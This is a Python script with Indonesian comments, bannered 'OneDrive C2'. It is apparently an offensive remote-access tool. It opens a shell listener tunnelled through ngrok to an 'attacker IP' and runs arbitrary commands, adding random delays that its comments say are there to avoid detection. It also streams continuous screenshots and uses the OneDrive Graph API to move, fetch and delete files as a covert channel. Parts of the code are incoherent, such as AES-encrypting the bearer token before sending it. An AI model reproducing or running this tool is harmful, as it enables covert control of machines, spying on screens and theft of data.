# Mengimpor modul yang dibutuhkan
import subprocess
import sys
import time
import threading
import socket
import base64
import os
import pyautogui
from pyvirtualdisplay import Display
import random
import shutil
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# Warna teks untuk output konsol
BLUE = '\033[94m'
RESET = '\033[0m'

# Menampilkan banner di awal program
print(BLUE + """
 ██████╗ ███╗   ██╗███████╗██████╗ ██████╗ ██╗██╗   ██╗███████╗     ██████╗██████╗ 
██╔═══██╗████╗  ██║██╔════╝██╔══██╗██╔══██╗██║██║   ██║██╔════╝    ██╔════╝╚════██╗
██║   ██║██╔██╗ ██║█████╗  ██║  ██║██████╔╝██║██║   ██║█████╗      ██║      █████╔╝
██║   ██║██║╚██╗██║██╔══╝  ██║  ██║██╔══██╗██║╚██╗ ██╔╝██╔══╝      ██║     ██╔═══╝ 
╚██████╔╝██║ ╚████║███████╗██████╔╝██║  ██║██║ ╚████╔╝ ███████╗    ╚██████╗███████╗
 ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═════╝ ╚═╝  ╚═══╝╚══════╝     ╚═════╝╚══════╝     
""" + RESET)

# Fungsi untuk mendapatkan informasi dari pihak penyerang
def get_attacker_info():
    attacker_ip = input("Masukkan alamat IP untuk reverse shell: ")
    return attacker_ip

# Fungsi untuk mengenkripsi token akses menggunakan AES
def encrypt_access_token(token):
    key = input("Masukkan kunci AES (harus 16, 24, atau 32 byte): ").encode()
    if len(key) not in [16, 24, 32]:  # Validasi panjang kunci
        print("Panjang kunci tidak valid. AES key harus 16, 24, atau 32 byte.")
        sys.exit(1)
    cipher = AES.new(key, AES.MODE_ECB)
    token_padded = pad(token.encode(), AES.block_size)  # Padding untuk token
    return base64.b64encode(cipher.encrypt(token_padded)).decode()

# Fungsi utama program
def main():
    # Mendapatkan informasi dari pengguna
    access_token = input("Masukkan ID Aplikasi OneDrive Anda: ")
    secret_id = input("Masukkan Secret ID OneDrive Anda: ")
    ip = get_attacker_info()
    port = input("Masukkan nomor port untuk reverse shell dan ngrok: ")

    print("Memulai tunnel ngrok...")
    # Memulai proses ngrok pada port yang ditentukan
    ngrok_process = subprocess.Popen(['ngrok', 'tcp', port])
    time.sleep(3)  # Memberi waktu ngrok untuk menginisialisasi

    # Mengenkripsi token akses
    access_token_encrypted = encrypt_access_token(access_token)

    # Menyiapkan header untuk API OneDrive
    headers = {
        "Authorization": f"Bearer {access_token_encrypted}",
        "Content-Type": "application/json",
        "User-Agent": "OneDrive-API-Client/1.0",
        "Connection": "keep-alive",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "X-Drive-Client-Secret": secret_id  # Menambahkan secret ID ke header
    }

    # Membuat socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, int(port)))  # Bind ke IP dan port yang ditentukan
    s.listen(1)
    print("Menunggu koneksi masuk...")
    client_socket, addr = s.accept()

    # Memulai shell pada terminal untuk menjalankan perintah
    shell = subprocess.Popen(['/bin/bash', '-i'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

    # Menyiapkan display virtual untuk pengambilan tangkapan layar
    display = Display(visible=0, size=(800, 600))
    display.start()

    # Membuat kamus sesi untuk mengelola sesi yang aktif
    sessions = {}
    session_counter = 1

    # Loop utama program untuk menerima perintah
    while True:
        command = input("Masukkan perintah yang akan dieksekusi (atau ketik 'exit' untuk keluar): ")
        if command.lower() == "exit":
            break

        time.sleep(random.uniform(1, 5))  # Penundaan acak untuk menghindari deteksi
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        stdout = result.stdout
        stderr = result.stderr

        # Mengirimkan perintah dan hasilnya ke client
        client_socket.send(command.encode())
        client_socket.send(stdout.encode())
        client_socket.send(stderr.encode())

        # Jika perintah adalah "screen", mulai sesi tangkapan layar
        if command.lower() == "screen":
            session_id = str(session_counter)
            session_counter += 1
            sessions[session_id] = {"socket": client_socket, "display": display}
            print(f"Memulai sesi layar {session_id}")

            screen = pyautogui.screenshot()
            screen_data = base64.b64encode(screen.tobytes()).decode('utf-8')
            client_socket.send(screen_data.encode())

            # Loop untuk mengambil tangkapan layar berkelanjutan
            while True:
                try:
                    screen = pyautogui.screenshot()
                    screen_data = base64.b64encode(screen.tobytes()).decode('utf-8')
                    client_socket.send(screen_data.encode())
                    time.sleep(0.1)  # Mengatur interval tangkapan layar
                except KeyboardInterrupt:
                    print("\nSesi layar berakhir.")
                    break

        # Mengunggah file ke OneDrive
        elif command.lower() == "upload":
            file_path = input("Masukkan path file yang akan diunggah: ")
            file_name = os.path.basename(file_path)
            with open(file_path, "rb") as f:
                file_data = f.read()
            url = "https://graph.microsoft.com/v1.0/me/drive/root:/" + file_name + ":/content"
            response = requests.put(url, headers=headers, data=file_data)
            client_socket.send(response.text.encode())

        # Mengunduh file dari OneDrive
        elif command.lower() == "download":
            file_path = input("Masukkan path file yang akan diunduh: ")
            url = "https://graph.microsoft.com/v1.0/me/drive/root:/" + file_path
            response = requests.get(url, headers=headers)
            with open(os.path.basename(file_path), "wb") as f:
                f.write(response.content)
            client_socket.send("File berhasil diunduh.".encode())

        # Mendapatkan file dari OneDrive
        elif command.lower() == "get":
            file_path = input("Masukkan path file: ")
            url = "https://graph.microsoft.com/v1.0/me/drive/root:/" + file_path
            response = requests.get(url, headers=headers)
            client_socket.send(response.text.encode())

        # Menghapus file dari OneDrive
        elif command.lower() == "remove":
            file_path = input("Masukkan path file yang akan dihapus: ")
            url = "https://graph.microsoft.com/v1.0/me/drive/root:/" + file_path
            response = requests.delete(url, headers=headers)
            client_socket.send(response.text.encode())

        # Menambahkan folder ke OneDrive
        elif command.lower() == "add":
            folder_path = input("Masukkan path folder yang akan dibuat: ")
            url = "https://graph.microsoft.com/v1.0/me/drive/root:/" + folder_path
            data = {"name": folder_path.split('/')[-1], "folder": {}}
            response = requests.post(url, headers=headers, json=data)
            client_socket.send(response.text.encode())

        # Menampilkan isi folder di OneDrive
        elif command.lower() == "list_folder":
            folder_path = input("Masukkan path folder untuk menampilkan isinya: ")
            url = "https://graph.microsoft.com/v1.0/me/drive/root:/" + folder_path + ":/children"
            response = requests.get(url, headers=headers)
            client_socket.send(response.text.encode())

        else:
            # Mengirimkan hasil perintah umum
            client_socket.send(stdout.encode())
            client_socket.send(stderr.encode())

    # Menutup koneksi dan tampilan
    client_socket.close()
    s.close()
    display.stop()

    # Mengakhiri proses ngrok
    ngrok_process.terminate()

# Eksekusi program utama
if __name__ == "__main__":
    main()
